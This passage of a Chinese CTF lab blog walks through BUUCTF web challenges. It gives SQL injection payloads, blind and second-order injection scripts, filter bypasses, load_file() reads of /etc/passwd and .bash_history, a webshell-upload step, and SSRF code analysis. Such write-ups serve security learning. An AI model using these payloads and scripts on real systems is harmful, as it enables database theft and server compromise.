$data);//执行结果又放到我们文件里面了\n\n关于这个题目解法实在太多了\n一句话木马\n既然可以写入文件，我们就试下写一句话木马然后用蚁剑连接\n主要思路就是url使用data伪协议去让GET命令执行结果为我们的一句话木马\n44.October 2019 Twice SQL Injection又是二次注入，终于来了个简单的。\n还是熟悉的登录和注册界面，还是熟悉的对注册和登录信息进行预处理\n登录进去后有个info输入框，写入后会出现回显，我们退出登录后重新进入也是直接有回显，说明info被储存到数据库里面去了，并且在这个界面有select语句对其进行查询\n我们首先注册一个admin的账号写下info，然后再注册一个admin&#39;#进行登录发现访问到admin账号的info，说明username是where的判断条件，闭合为单引号闭合\n我们尝试注册regulus&#39; order by 99 #发现没有报错，但是在写info的时候会出现错误，这个条件感觉可以用来布尔盲注，但是这题没那么难\n由于没有报错回显我们考虑联合注入，并且union select都没被过滤。但是这里有个坑爹的地方就是他指定了查询只查询info列，我们联合查询只需要查询一个列即可\nregulus&#x27;union select database()  ##ctftrainingregulus&#x27;union select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot;  ##flag,news,usersregulus&#x27;union select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;  ##flagregulus&#x27;union select flag from flag  ##flag&#123;165116e4-0562-4b68-bcf6-7304dec999cc&#125;\n\n\n\n45.[CISCN2019 总决赛 Day2 Web1]Easyweb又是sql注入，而且这次题目藏得好深\n开始是一个登录界面，我们照常尝试robots.txt .git .www.zip。访问robots.txt得到\nUser-agent: *Disallow: *.php.bak\n\n看起来是在php后面加上.bak，但是我看了题解才知道要打开图片，到image.php.bak里面去拿到源码，我们发现后面跟了个?id&#x3D;3，这里就是sql注入点\n&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);//这里面第一个是为了转义实际上替换的是//\\0 %00 \\&#x27; &#x27;$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);\n\n这个题目一次就用了两种我以前没见过的闭合方式，长见识了\n话说怎么题解的脚本跑不出啊(服了，出去上个厕所热点断了，导致学校的网拦住)\n我们以前都是通过注释符将后面的参数注释掉进行盲注的，但是这次不一样，由于addslashes()和$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);的存在我们无法简单闭合语句，注释会被认定为字符串，我们主动单引号闭合会被删掉\n而我们就要搞一个骚操作，总共四个单引号。我们最终是通过对二号单引号进行转义，导致id=&#39;&#123;$id&#125;\\&#39; or path=&#39;第一个和第三个闭合我们传入的$&#123;path&#125;就不需要闭合了可以直接注释四号引号\n具体做法就是利用addslashes()和$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);。当我们传入id=\\0会被转义为\\\\0被替换后为\\,我们的sql语句就变成了select * from images where id=&#39;\\&#39; or path=&#39;&#123;$path&#125;&#39;第二个引号被转义了，现在我们可以利用path直接注释了\n我们注意到当照片成功查询到的时候\n\n\n这里面有一串字符JFIF可以作为标识\n直接开始布尔盲注爆破数据库\nimport requestsurl=&#x27;http://ceaff688-a92c-469a-8f1b-0d7b52bebe5b.node5.buuoj.cn:81/image.php?id=\\\\0&amp;path=&#x27;flag=&#x27;&#x27;# images,users select group_concat(table_name) from information_schema.tables where table_schema=database()# username,password  select group_concat(column_name) from information_schema.columns where table_name=0x7573657273# admin948d8838cb65f014bb44payload=&quot;or (ascii(substr((select concat(username,password) from users),&#123;&#125;,1))&gt;&#123;mid&#125;)%23&quot;for i in range(1,50):    low = 32    high = 127    while low&lt;high :        mid = (low + high) // 2        r=requests.get(url+payload.format(i,mid=mid))        if &#x27;JFIF&#x27; in r.text:            low=mid+1        else :            high=mid    if low!=32:        flag+=chr(low)        print(flag)    else :     break\n\n关于这个脚本有需要注意的地方，由于单引号被过滤掉了，但sql里面字符串必须用引号包起来我们就需要用到十六进制\n然后就是注释不能用#，必须url编码\n在URL和HTTP请求中，# 是一个特殊字符，它通常用于表示 URL片段标识符（Fragment Identifier），浏览器不会将 # 及其后面的内容发送到服务器。因此，在构造SQL注入Payload时，如果直接使用 # 注释SQL语句，它不会被传递到后端数据库，导致注入失败。\n脚本中我们之前是作为GET传递参数，但是这次是直接用url去GET传参访问\n我们成功注出了账号和密码，登录进去后发现是一个文件上传\n我们随便上传后发现过滤掉了.php，但是。phtml还可以用，这个不重要\n上传成功后返回一个路径，我们访问过去发现是一个日志文件里面记录了我刚才上传的文件的名称\n于是我们直接在文件名中写一句话木马即可\n\n\n由于过滤掉了php，我们需要使用短标签\n\n\n最后用蚁剑连接访问flag就行了\n也可以直接命令执行\n\n\n\n\n46.[NCTF2019]SQLibuu还是喜欢把相似的题目放到一起的，这又是一个利用\\进行转义和%00进行截断的题目\n题目首先是一个登录框，顺便把sql语句告诉我们了\nsqlquery : select * from users where username=&#x27;1&#x27; and passwd=&#x27;1&#x27;\n\n我们访问robots.txt时发现hint.txt文件，我们访问拿到黑名单\n$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag;\n\n这把我们常用的注入方法都过滤掉了，但是看了wp当然知道这题用布尔盲注，但是select和where这些关键字都被过滤掉了，我们不能用二分法去爆破数据库，但是If $_POST[&#39;passwd&#39;] === admin&#39;s password,我们只需要拿到admin的passwd即可，我们可以利用这个查询配合正则匹配去把passwd给盲注出来\n我们首先得看到正误回显我们先抓包传入，由于我们需要使用%00进行截断，但是url会判断为url编码会转化为空，我们需要抓包改\nusername=\\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^&quot;;%00#于是我们的sql语句就成了select * from users where username=&#x27;\\&#x27; and passwd=&#x27;||/**/passwd/**/regexp/**/&quot;^&quot;;%00&#x27;#用||代替or 然后对passwd进行正则匹配\n\n\n\n这是正确的界面，会跳转到welcom.php\n理论成立，直接开始写脚本\nimport requestsfrom urllib import parseurl=&#x27;http://2e5bfb47-b8df-406a-9972-c1440d970e77.node5.buuoj.cn:81/&#x27;flagstr=&#x27;abcdefghijklmnopqrstuvwxyz_1234567890&#x27;flag=&#x27;&#x27;for i in range(1,100):    for j in flagstr:        data=&#123;            &#x27;username&#x27;:&#x27;\\\\&#x27;,            &#x27;passwd&#x27;:&#x27;||/**/passwd/**/regexp/**/\\&quot;^&#123;&#125;\\&quot;;&#123;&#125;&#x27;.format((flag+j),parse.unquote(&#x27;%00&#x27;))                                                #这里的两个转义符是为了在python代码中转义&quot;&quot;  parse.unquote则是为了不让%00被解码        &#125;        response=requests.post(url,data=data)        if &#x27;welcome&#x27; in response.text:            flag+=j            print(flag)            break\n\n密码部分 (passwd=&#39;||/\\**/passwd/\\**/regexp/\\**/&quot;^a&quot;;%00&#39;)\n\n|| 是逻辑或操作符，通过注释符 /**/ 混淆空格绕过过滤。\npasswd regexp &quot;^a&quot; 是一个正则表达式匹配，检查 passwd 字段是否以字母 a 开头。\n%00 是NULL字节，用于截断后续查询（部分数据库会忽略%00后的内容）。\n\n47.[网鼎杯 2018]Comment网鼎杯的题目就没有一个简单的，这次主要考 二次注入 爆破 git源码泄露\n这是一个留言板，我们留言之前需要登录，如果让我们直接用字典把账号和密码爆破出来这太难了也很没必要。\n输入框原来为\n\n\n这应该就是让我们去爆破zhangwei后面未知的三位，我们先使用bp爆破数字，发现密码为zhangwei666\n登录进入后可以留言，但是没找到什么突破口，尝试&#x2F;.git的时候发现存在，就使用GitHack下载过来\n&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;:    break;case &#x27;comment&#x27;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;\n\n但是这很明显没有利用的地方，看wp说需要用GitHacker去还原源码，我还没有下载就把wp的源码抄下来\n&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;    switch ($_GET[&#x27;do&#x27;])    &#123;        case &#x27;write&#x27;:            $category = addslashes($_POST[&#x27;category&#x27;]);            $title = addslashes($_POST[&#x27;title&#x27;]);            $content = addslashes($_POST[&#x27;content&#x27;]);            $sql = &quot;insert into board            set category = &#x27;$category&#x27;,                title = &#x27;$title&#x27;,                content = &#x27;$content&#x27;&quot;;            $result = mysql_query($sql);            header(&quot;Location: ./index.php&quot;);            break;        case &#x27;comment&#x27;:            $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);            $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;            $result = mysql_query($sql);            $num = mysql_num_rows($result);            if($num&gt;0)&#123;                $category = mysql_fetch_array($result)[&#x27;category&#x27;];                $content = addslashes($_POST[&#x27;content&#x27;]);                $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;                $result = mysql_query($sql);            &#125;            header(&quot;Location: ./comment.php?id=$bo_id&quot;);            break;        default:            header(&quot;Location: ./index.php&quot;);    &#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;\n\ninsert into comment set category = &#x27;&#x27;,content=(user()),/*&#x27;,content = &#x27;*/#&#x27;,bo_id = &#x27;$bo_id&#x27;&quot;;$result = mysql_query($sql);\n\n我们看源代码发现第一次进行了转义，所以我们不考虑直接注入，然后在第二次执行sql语句的时候\n$category = mysql_fetch_array($result)[&#x27;category&#x27;];\n\n未对这个字段进行转义，直接从查询结果里面拿，看来二次注入点在这里\n这里说一下，第一次和第二次insert语句的时候content是两张表的两个不同的字段，两次都是通过POST请求传递的\n看了wp发现了我的另外一个知识盲区，就是这次sql语句特地采用了\n $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;                $result = mysql_query($sql);//使用了换行 我们不能通过category直接使用# --+等单行注释符进行注释，需要用到/**/多行注释\n\n于是我们还是以category为注入点，由于content会回显出来，我们使用content进行查询\n\n\n由于看了wp，知道了flag不在数据库里面所以就不去注数据库了\n#我们使用load_file()之前得看看mysql是否有管理员权限category=&#x27;,content=(user()),/*content=*/#            为了闭合多行注释符并注释后面的,&#x27;\n\n\n\n成功发现为root权限\n后面的操作我只能跟着wp来了，而且这个找到flag的方法有好多种\n#我们只需要使用load_file()继续读取文件即可category=&#x27;,content=(load_file(&#x27;/etc/passwd&#x27;)),/*\n\n Linux 系统中，/etc/passwd 是一个重要的文本文件，用于存储用户账户的基本信息。它包含以下字段，每个字段用冒号 : 分隔，格式如下：\nusername:password:UID:GID:user_info:home_directory:login_shell\n\n各字段含义：\n\nusername 用户登录名（如 root、bin、普通用户等）。\npassword 历史上存储加密后的用户密码，现在通常为 x（密码已移至 /etc/shadow 文件以提高安全性）。\nUID (User ID) 用户的数字标识符：\n0：超级用户（root）的 UID。\n1–999：系统保留给服务账户的 UID。\n1000+：普通用户的 UID。\n\n\nGID (Group ID) 用户主组的数字标识符，对应 /etc/group 中的条目。\nuser_info (GECOS) 用户的描述信息（如全名、电话等），可选字段。\nhome_directory 用户的家目录路径（如 /home/username）。\nlogin_shell 用户登录时默认的 Shell（如 /bin/bash）。若为 /sbin/nologin，则表示禁止登录。\n\n也就是我们可以获得用户信息\n 1. 用户类型分类\n\n超级用户：  root:x:0:0:root:/root:/bin/bash\nUID 和 GID 均为 0，表示这是超级管理员账户。\n家目录为 /root，登录 Shell 是 /bin/bash（允许交互式登录）。\n\n\n系统服务账户（UID 1–999）：  例如 daemon, bin, sys, www-data, mysql 等。\n这些账户用于运行系统服务或守护进程（如 mysql 用于 MySQL 服务）。\n多数 Shell 设为 /usr/sbin/nologin 或 /bin/false，禁止交互式登录（安全措施）。\n\n\n普通用户（UID ≥1000）：  www:x:500:500:www:/home/www:/bin/bash\n这是一个普通用户（UID 500，可能为早期系统创建）。\n家目录 /home/www，允许通过 /bin/bash 登录。\n\n\n特殊账户：  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n用于限制权限的匿名账户（常见于服务运行时降权）。\n\n\n\n\n\n我们发现除了root和系统账号以外还有个普通账号www在&#x2F;home&#x2F;www下\n查看/home/www/.bash_history.bash_history ：保存了当前用户使用过的历史命令,方便查找&#x27;,content=(load_file(&quot;/home/www/.bash_history&quot;)),/*      &#x27;拿到 cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 解释一下：先进入/tmp目录,解压缩了html.zip文件(得到/tmp/html)，之后将html.zip删除了，拷贝了一份html给了/var/www目录(得到/var/www/html)，之后将/var/www/html下的.DS_Store文件删除，但是/tmp/html下的.DS_Store文件没有删除,查看一下unzip:解压缩.DS_Store:这个文件是常见的备份文件\n\n于是我们可以访问&#x2F;tmp&#x2F;html&#x2F;.DS_Store下拿到html的备份文件\n&#x27;,content=(load_file(&quot;/temp/html/.DS_Store&quot;)),/*    上面这个无回显.DS_Store经常会有一些不可见的字符，使用hex函数对其进行16进制转换&#x27;,content=(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*我们拿到16进制数据后再再去进行hex解码拿到flag_8946e1ff1ee3e40f.php\n\n拿到文件名称直接访问\n&#x27;,content=(hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;))),/*然后进行hex解码，拿到flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;但是wp说这是假的flag，真的在/var/www/html/flag_8946e1ff1ee3e40f.php\n\n太多东西了先把payload抄下来吧\n&#x27;,content=(hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*\n\n\n\n48.[HarekazeCTF2019]encode_and_encodebuu第三页也是要结束了，我打算写完50个题目后由于题解过长就单独一个一个题目写了都1万多字了\n这又是一个php特性的题目\n &lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#x27;\\.\\.&#x27;,    // no stream wrapper    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,    // no data exfiltration    &#x27;flag&#x27;  ];  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;  $page = $json[&#x27;page&#x27;];  $content = file_get_contents($page);  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;;  &#125;&#125; else &#123;  $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); \n\n先是对我们的输入进行一个文件读取，但是我好像对file_get_contents()这个函数有点不了解\nfile_get_contents() 的完整能力\nfile_get_contents(&#x27;/path/to/file.txt&#x27;);  // 读取文件系统上的文件file_get_contents(&#x27;http://example.com/file&#x27;);  // 读取远程URL内容file_get_contents(&#x27;php://input&#x27;);    // 读取原始POST数据file_get_contents(&#x27;php://filter/convert.base64-encode/resource=file.php&#x27;);  // 处理文件内容file_get_contents(&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;);  // Data URI\n\n当我们传入json数据的时候属于读取POST数据，会把我们的POST传参的数据放入变量$data\n然后就是进行了解码和一个正则匹配和后再进行编码结果，然后把拿到的文件内容转化为数组然后进行编码\n我们只需要绕过正则匹配访问到/flag即可\n但是我们php等协议都被过滤掉了，我们需要利用json_decode()这个函数的特性\n发现这个题目的关键地方是json_decode会将\\uxxx进行转义，这样就可以绕过is_valid的检测。应该就是利用is_valid()识别的是原始字符串不会进行解码，file_get_contents()会对其进行解码\npayload\n&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;&#125;unicode编码为  php://filter/convert.base64-encode/resource=/flag\n\n\n\n49.[De1CTF 2019]SSRF Me 没写完不会最后两个题目了，加油。\n#! /usr/bin/env python# #encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):  # 是一个简单的赋值函数        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if (not os.path.exists(self.sandbox)):  # 如果没有该文件夹，则创立一个文件夹            os.mkdir(self.sandbox)    def Exec(self):        result = &#123;&#125;        result[&#x27;code&#x27;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)  # 注意w，可以对result.txt文件进行修改                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&#x27;data&#x27;] = resp                else:                    print                    resp                    tmpfile.write(resp)  # 这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中                    tmpfile.close()                result[&#x27;code&#x27;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)  # 打开方式为只读                result[&#x27;code&#x27;] = 200                result[&#x27;data&#x27;] = f.read()  # 读取result.txt中的数据            if result[&#x27;code&#x27;] == 500:                result[&#x27;data&#x27;] = &quot;Action Error&quot;        else:            result[&#x27;code&#x27;] = 500            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])  # 注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))  # cookie传递action参数，对应不同的处理方式    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))  # 传递get方式的参数param    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))  # cookie传递sign参数sign    ip = request.remote_addr  # 获取请求端的ip地址    if (waf(param)):  # 调用waf函数进行过滤        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)  # 创建Task类对象    return json.dumps(task.Exec())  # 以json的形式返回到客户端@app.route(&#x27;/&#x27;)def index():    return open(&quot;code.txt&quot;, &quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]  # 这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫    except:        return &quot;Connection Timeout&quot;def getSign(action, param):  # getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):  # 将传入的字符串进行md5加密    return hashlib.md5(content).hexdigest()def waf(param):  # 防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true    check = param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &#x27;__main__&#x27;:    app.debug = False    app.run(host=&#x27;0.0.0.0&#x27;, port=9999)\n\npython代码审计也太难了吧，我们先不看函数。看路由\n@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])  # 注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))  # cookie传递action参数，对应不同的处理方式    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))  # 传递get方式的参数param    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))  # cookie传递sign参数sign    ip = request.remote_addr  # 获取请求端的ip地址    if (waf(param)):  # 调用waf函数进行过滤        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)  # 创建Task类对象    return json.dumps(task.Exec())  # 以json的形式返回到客户端@app.route(&#x27;/&#x27;)def index():    return open(&quot;code.txt&quot;, &quot;r&quot;).read()\n\n其中我们再结合函数分析代码\n/geneSign路由是把我们传入的param和action=scan进行一个加密并返回加密值。/De1ta路由则是通过cookie获取sign和action，通过GET获取param，以及我们的ip，对我们GET传入参数param进行过滤，过滤掉了gopher和file协议。如果我们通过了过滤则把参数传递到Task类中并实例化，然后调用类中的Exec()返回数据\nclass Task:    def __init__(self, action, param, sign, ip):  # 是一个简单的赋值函数        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if (not os.path.exists(self.sandbox)):  # 如果没有该文件夹，则创立一个文件夹            os.mkdir(self.sandbox)    def Exec(self):        result = &#123;&#125;        result[&#x27;code&#x27;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)  # 注意w，可以对result.txt文件进行修改                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&#x27;data&#x27;] = resp                else:                    print                    resp                    tmpfile.write(resp)  # 这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中                    tmpfile.close()                result[&#x27;code&#x27;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)  # 打开方式为只读                result[&#x27;code&#x27;] = 200                result[&#x27;data&#x27;] = f.read()  # 读取result.txt中的数据            if result[&#x27;code&#x27;] == 500:                result[&#x27;data&#x27;] = &quot;Action Error&quot;        else:            result[&#x27;code&#x27;] = 500            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False\n\n我们的主要方法是通过scan函数\ndef scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]  # 这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫    except:        return &quot;Connection Timeout&quot;\n\n我们可以利用param这个参数访问flag.txt，访问到flag.txt后会把flag.txt写入result.txt里面\n50.[网鼎杯2018]Unfinish终于到50题了，也是要写完这篇博客了\n题目是一个正常的登录注册界面，我们注册登录进去后发现用户名有回显，其他的都没有，优先考虑二次注入。\n我们发现当我们在注册界面输入一些特殊字符的时候会注册失败，并且没有报错回显\n我们猜测sql语句长这个样子\ninsert into tables values(&#x27;$email&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;)\n\n而有回显的username这个字段就是我们的注入点，我们之前都是直接闭合加注释去注入的但是这是insert语句后面还有一个字段\n我们如果想要逃逸出闭合了那就只能跳出username了，但是这样的话这条查询语句就不对了，本来要插入三个变量，现在逃逸之后变成两个这显然行不通了，那么我们就只能考虑不去闭合，并且让我们的查询语句成功执行，这显然很好构建\ninsert into tables values(&#x27;$email&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;)insert into tables values(&#x27;$email&#x27;,&#x27;&#x27;+(ascii(select database())+&#x27;&#x27;,&#x27;$password&#x27;)123&#x27;,&#x27;$password&#x27;)#insert into tables values(&#x27;$email&#x27;,&#x27;123&#x27;,&#x27;$password&#x27;)#&#x27;,&#x27;$password&#x27;)\n\n我们在注册的时候发现逗号被过滤掉了，我们不仅无法通过闭合注释进行查询，这样的话盲注就有点行不通了\n一开始我还在奇怪为什么不直接查询而是用ascii()一个个字母的去试出来，MySQL里面没有像加号一样的字符串拼接符，只能用concat()函数，我们如果直接查询的话会被类型转换为0(加号作为运算符)\n所以我们只能通过ascii()去猜测，还有就是过滤掉了information，我们对这个的应对方法就是用相同的关键词去替换，但是列名是没办法去替换的，我们实在不行就只能无列名注入，但大多数情况我感觉可以先猜一下\n我们直接抄大佬的脚本，二次注入我还是第一次写\nimport requestsfrom bs4 import BeautifulSoupdef select_database():    database= &quot;&quot;    for i in range(100):        data_register=&#123;            &quot;email&quot;: &quot;%d@qq.com&quot; %(i),            &quot;username&quot;: f&quot;0&#x27;+(select ascii(substr(database()from &#123;i+1&#125; for 1)))+&#x27;0&quot;,            &quot;password&quot;: &quot;%d&quot; %(i)        &#125;        register=requests.post(url=&quot;http://a5b133a7-b13a-4bdd-baff-74323b32b30a.node5.buuoj.cn:81/register.php&quot;, data=data_register)        data_login=&#123;            &quot;email&quot;:&quot;%d@qq.com&quot; %(i),            &quot;password&quot;:&quot;%d&quot; %(i)        &#125;        login=requests.post(url=&quot;http://a5b133a7-b13a-4bdd-baff-74323b32b30a.node5.buuoj.cn:81/login.php&quot;, data=data_login)        html=login.text        soup=BeautifulSoup(html,&#x27;html.parser&#x27;)        getUsername = soup.find_all(&#x27;span&#x27;)[0]        username = getUsername.text        o = int(username)        if o == 0:            break        database += chr(int(username))        print(database)    return databasedef select_flag():    flag = &quot;&quot;    for i in range(100):        data_register = &#123;            &quot;email&quot;: &quot;%d@qqq.com&quot; % (i),            &quot;username&quot;: f&quot;0&#x27;+ascii(substr((select * from flag) from &#123;i+1&#125; for 1))+&#x27;0&quot;,            &quot;password&quot;: &quot;%d&quot; % (i)        &#125;        register = requests.post(url=&quot;http://a5b133a7-b13a-4bdd-baff-74323b32b30a.node5.buuoj.cn:81/register.php&quot;,                                 data=data_register)        data_login = &#123;            &quot;email&quot;: &quot;%d@qqq.com&quot; % (i),            &quot;password&quot;: &quot;%d&quot; % (i)        &#125;        login = requests.post(url=&quot;http://a5b133a7-b13a-4bdd-baff-74323b32b30a.node5.buuoj.cn:81/login.php&quot;,                              data=data_login)        html = login.text        soup = BeautifulSoup(html, &#x27;html.parser&#x27;)        getUsername = soup.find_all(&#x27;span&#x27;)[0]        username = getUsername.text        o = int(username)        if o == 0:            break        flag += chr(int(username))        print(flag)  print(select_database())print(select_flag())\n\n这里我们需要注意的是我们不能像布尔盲注那样通过回显通过二分法推测出ascii码值，我们这次是直接查询出ascii码值。我们需要在html界面中找出username回显，这时候就需要用到soup=BeautifulSoup(html,&#39;html.parser&#39;)将html.txt解析为html类型的数据，找到代表username的标签通过getUsername = soup.find_all(&#39;span&#39;)[0]实现，然后提取其中的文本内容username = getUsername.text\n我们的注入逻辑就是先向register.php发送注册请求，然后再向login.php发送登录命令把username回显出来，我们把表名flag注出来之后，由于information被ban掉了，我们直接注入select *from flag把数据跑出来，无列名注入太麻烦了\n"},{"title":"[CISCN2021_Quals]upload","url":"/2025/10/14/CISCN2021-Quals-upload/","content":"[CISCN2021_Quals]upload&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123;        die(&quot;这么大个的东西你是想d我吗？&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]);//从我们上传的数据中提取图片信息    if ($imageinfo === FALSE) &#123;        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;东西不能方方正正的话就很讨厌&quot;);    &#125;    